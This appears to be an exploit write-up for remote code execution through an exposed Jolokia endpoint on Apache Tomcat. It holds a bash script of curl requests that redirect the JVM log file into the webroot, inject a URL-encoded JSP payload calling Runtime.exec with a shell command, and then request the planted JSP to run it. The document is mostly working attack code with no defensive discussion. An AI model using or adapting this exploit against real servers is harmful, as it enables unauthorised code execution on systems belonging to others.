# Short description

- Use DiagnosticCommand/vmLog to define the vm logfile to a writeable path in the webroot, controled extension
- Inject your JSP payload in the logfile by triggering an error
- Disable logs to avoid bloating the jsp file created
- Trigger RCE by querying the jsp file on the webroot


# Exploit

```bash
JSPFILE=jsp$RANDOM.jsp
echo "JSPFILE: $JSPFILE"
# Adjust the path depending on your version, target, etc
curl -kg 'http://127.0.0.1/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/opt!/apache-tomcat-9.0.16!/webapps!/ROOT!/'"$JSPFILE"
sleep 1
# If needed, double-encode, this depends on the reverse proxy configuration
curl -kg 'http://127.0.0.1/jolokia/win%3C%25%20Runtime.getRuntime%28%29.exec%28new%20String%5B%5D%20%7B%20%22sh%22%2C%20%22-c%22%2C%20%22id%3E!/tmp!/id.out%22%20%7D%29%3B%20%25%3Ewin'
sleep 1
curl -kg 'http://127.0.0.1/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable'
sleep 1
# Trig your payload
curl -kg 'http://127.0.0.1/'"$JSPFILE"
```